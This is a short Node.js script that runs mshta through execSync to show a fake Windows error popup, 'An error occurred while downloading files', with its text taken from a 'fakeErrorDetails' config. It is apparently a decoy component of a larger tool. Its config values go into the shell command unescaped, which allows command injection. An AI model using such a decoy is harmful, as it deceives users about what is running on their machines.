const { execSync } = require('child_process');
const { fakeErrorDetails } = require('../config');

const title = fakeErrorDetails.title || 'Error';
const message = fakeErrorDetails.message || 'An error occurred while downloading files. Please try again later.';

const cmd = `mshta "javascript:new ActiveXObject('WScript.Shell').Popup('${message}', 0, '${title}', 16);close()"`;

execSync(cmd);
